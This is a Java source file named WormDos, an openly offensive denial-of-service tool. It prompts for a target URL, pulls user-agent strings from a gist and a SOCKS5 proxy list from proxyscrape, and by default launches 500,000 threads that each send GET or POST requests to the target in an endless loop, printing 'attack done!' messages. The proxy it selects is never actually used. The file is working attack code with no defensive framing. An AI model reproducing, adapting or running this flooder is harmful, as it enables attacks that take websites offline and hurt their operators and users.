import java.io.*;
import java.net.*;
import java.util.*;

import javax.net.ssl.HttpsURLConnection;

public class WormDos implements Runnable {
    
    private static List<String> USER_AGENTS = getUserAgents();
    private String USER_AGENT = getRandomUserAgent();

    private static List<String> proxies = getProxies();
    private static int amount = 0;
    private static String url = "";
    private String proxy;
    int seq;
    int type;

    public WormDos(int seq, int type) {
        this.seq = seq;
        this.type = type;

        // Ensure that the proxy list is not empty before trying to access it
        if (proxies.isEmpty()) {
            throw new IllegalStateException("Proxy list is empty, cannot proceed with attack.");
        }

        this.proxy = proxies.get(new Random().nextInt(proxies.size()));
    }

    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 1:
                        postAttack(WormDos.url);
                        break;
                    case 2:
                        sslPostAttack(WormDos.url);
                        break;
                    case 3:
                        getAttack(WormDos.url);
                        break;
                    case 4:
                        sslGetAttack(WormDos.url);
                        break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String getRandomUserAgent() {
        return USER_AGENTS.get(new Random().nextInt(USER_AGENTS.size()));
    }

    private static List<String> getUserAgents() {
        List<String> userAgentList = new ArrayList<>();
        try {
            URL url = new URL("https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt");
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setRequestMethod("GET");
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                userAgentList.add(inputLine);
            }
            in.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return userAgentList;
    }

    private static List<String> getProxies() {
        List<String> proxyList = new ArrayList<>();
        try {
            URL url = new URL("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all");
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setRequestMethod("GET");
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                proxyList.add(inputLine);
            }
            in.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        if (proxyList.isEmpty()) {
            System.out.println("Warning: No proxies found, continuing without proxies.");
        }

        return proxyList;
    }

    private void checkConnection(String url) throws Exception {
        System.out.println("Checking Connection");
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("Connected to website");
        }
        WormDos.url = url;
    }

    private void sslCheckConnection(String url) throws Exception {
        System.out.println("Checking Connection (ssl)");
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("Connected to website");
        }
        WormDos.url = url;
    }

    private void postAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("POST attack done!: " + responseCode + " Thread: " + this.seq);
    }

    private void getAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        System.out.println("GET attack done!: " + responseCode + " Thread: " + this.seq);
    }

    private void sslPostAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("SSL POST attack done!:" + responseCode + " Thread: " + this.seq);
    }

    private void sslGetAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        System.out.println("SSL GET attack done!: " + responseCode + " Thread: " + this.seq);
    }

    public static void main(String[] args) throws Exception {
        Scanner in = new Scanner(System.in);
        System.out.print("Enter Url: ");
        WormDos.url = in.nextLine();
        System.out.println("\n");
        System.out.println("Starting Attack to url: " + WormDos.url);

        String[] SUrl = WormDos.url.split("://");
        WormDos dos = new WormDos(0, 0);
        System.out.println("Checking connection to Site");
        if ("http".equals(SUrl[0])) {
            dos.checkConnection(WormDos.url);
        } else {
            dos.sslCheckConnection(WormDos.url);
        }

        System.out.println("Setting DDoS Attack");
        System.out.print("Thread: ");
        String amountStr = in.nextLine();

        if (amountStr == null || amountStr.trim().isEmpty()) {
            WormDos.amount = 500000; // Upgraded to 500k threads
        } else {
            WormDos.amount = Integer.parseInt(amountStr);
        }

        System.out.print("method: ");
        String option = in.nextLine();
        int ioption;
        if ("get".equalsIgnoreCase(option)) {
            ioption = "http".equals(SUrl[0]) ? 3 : 4;
        } else {
            ioption = "http".equals(SUrl[0]) ? 1 : 2;
        }

        for (int i = 0; i < WormDos.amount; i++) {
            Thread t = new Thread(new WormDos(i, ioption));
            t.start();
        }

        in.close();
    }
}
